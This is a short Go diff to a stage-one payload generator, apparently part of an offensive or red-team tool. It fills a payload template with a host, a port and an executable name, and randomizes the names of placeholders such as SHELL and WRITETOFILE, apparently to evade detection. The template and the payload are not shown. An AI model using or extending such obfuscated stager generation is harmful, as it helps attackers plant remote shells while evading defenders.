@@ -50,14 +50,13 @@ func (sopg *StageOnePayloadGenerator) preparePayloadSource() (string, error) {
 	if err != nil {
 		return "", fmt.Errorf("can't get template from templates/ folder: %v", err)
 	}
-	connType := "tcp"
 	payloadSource = strings.Replace(payloadSource, "HOST", sopg.host, -1)
 	payloadSource = strings.Replace(payloadSource, "PORT", sopg.port, -1)
-	payloadSource = strings.Replace(payloadSource, "CONN_TYPE", connType, -1)
-	funcPatterns := []string{"FUNC_DELETE", "FUNC_HANDLE"}
+	funcPatterns := []string{"WRITETOFILE", "SHELL", "FILENAME"}
 	for _, funcPattern := range funcPatterns {
 		payloadSource = strings.Replace(payloadSource, funcPattern, util.RandString(util.RandInt()), -1)
 	}
+	payloadSource = strings.Replace(payloadSource, "EXECUTABLENAME", sopg.executableName, -1)
 	return payloadSource, nil
 }
 
